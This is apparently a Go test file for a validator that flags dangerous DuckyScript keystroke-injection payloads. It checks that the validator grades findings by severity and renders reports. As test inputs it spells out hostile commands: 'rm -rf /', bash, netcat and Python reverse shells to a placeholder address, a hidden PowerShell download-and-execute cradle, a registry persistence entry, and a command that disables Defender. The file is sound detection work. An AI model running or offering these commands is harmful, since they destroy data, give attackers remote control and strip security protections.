package validator

import (
	"strings"
	"testing"
)

func TestValidate_BenignPayload(t *testing.T) {
	src := `REM simple hello world
DELAY 1000
STRING Hello, world!
ENTER
`
	rep := Validate("hello.txt", src)
	if len(rep.Findings) != 0 {
		t.Fatalf("want 0 findings, got %d: %+v", len(rep.Findings), rep.Findings)
	}
	if rep.Severity != SeverityInfo {
		t.Errorf("severity=%v want info", rep.Severity)
	}
}

func TestValidate_RmRfRootIsCritical(t *testing.T) {
	src := `DELAY 500
STRING rm -rf /
ENTER
`
	rep := Validate("wipe.txt", src)
	if rep.Severity != SeverityCritical {
		t.Fatalf("severity=%v want critical", rep.Severity)
	}
	if !rep.Has(SeverityCritical) {
		t.Error("Has(SeverityCritical) should be true")
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "rm_rf_root" {
			found = true
			if f.Line != 2 {
				t.Errorf("line=%d want 2", f.Line)
			}
		}
	}
	if !found {
		t.Errorf("expected rm_rf_root finding, got %+v", rep.Findings)
	}
}

func TestValidate_SkipsREMCommentsAndLowercase(t *testing.T) {
	// REM lines are comments; lowercase first-tokens aren't DuckyScript
	// opcodes so the whole line is scanned. The REM line should NOT
	// trigger; the lowercase one SHOULD.
	src := `REM rm -rf /
something rm -rf /
`
	rep := Validate("mixed.txt", src)
	var lines []int
	for _, f := range rep.Findings {
		if f.Rule == "rm_rf_root" {
			lines = append(lines, f.Line)
		}
	}
	if len(lines) != 1 {
		t.Fatalf("want exactly 1 rm_rf_root hit, got lines %v (all findings: %+v)", lines, rep.Findings)
	}
	if lines[0] != 2 {
		t.Errorf("hit on line %d, want 2 (REM line should be skipped)", lines[0])
	}
}

func TestValidate_ReverseShellDetection(t *testing.T) {
	cases := map[string]string{
		"bash_tcp": `STRING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		"nc_e":     `STRING nc -lvp 4444 10.0.0.1 4444 -e /bin/sh`,
		"python":   `STRING python -c "import socket; s=socket.socket(); s.connect(('x', 1))"`,
		"pwsh":     `STRING powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://x/p')"`,
	}
	for name, src := range cases {
		t.Run(name, func(t *testing.T) {
			rep := Validate(name, src)
			if rep.Severity != SeverityCritical {
				t.Errorf("severity=%v want critical; findings=%+v", rep.Severity, rep.Findings)
			}
		})
	}
}

func TestValidate_PersistenceIsWarn(t *testing.T) {
	src := `STRING reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v evil /d C:\evil.exe`
	rep := Validate("persist.txt", src)
	if rep.Severity != SeverityWarn {
		t.Fatalf("severity=%v want warn", rep.Severity)
	}
}

func TestValidate_DefenseDisableIsCritical(t *testing.T) {
	src := `STRING Set-MpPreference -DisableRealtimeMonitoring $true`
	rep := Validate("defender.txt", src)
	if rep.Severity != SeverityCritical {
		t.Fatalf("severity=%v want critical", rep.Severity)
	}
}

func TestValidate_LongTypingIsInfoOnly(t *testing.T) {
	var b strings.Builder
	for i := 0; i < 500; i++ {
		b.WriteString("STRING " + strings.Repeat("x", 10) + "\n")
	}
	rep := Validate("long.txt", b.String())
	if rep.Severity != SeverityInfo {
		t.Fatalf("severity=%v want info", rep.Severity)
	}
	found := false
	for _, f := range rep.Findings {
		if f.Rule == "long_typing" {
			found = true
		}
	}
	if !found {
		t.Error("expected long_typing finding")
	}
}

func TestReport_RenderText(t *testing.T) {
	rep := Validate("bad.txt", "STRING rm -rf /\n")
	out := rep.RenderText()
	if !strings.Contains(out, "critical") {
		t.Errorf("rendered output missing severity tag: %s", out)
	}
	if !strings.Contains(out, "rm -rf /") {
		t.Errorf("rendered output missing excerpt: %s", out)
	}
}

func TestReport_EmptyRenderText(t *testing.T) {
	rep := Validate("clean.txt", "DELAY 100\nSTRING hi\n")
	out := rep.RenderText()
	if !strings.Contains(out, "no findings") {
		t.Errorf("empty-report render should say 'no findings': %s", out)
	}
}
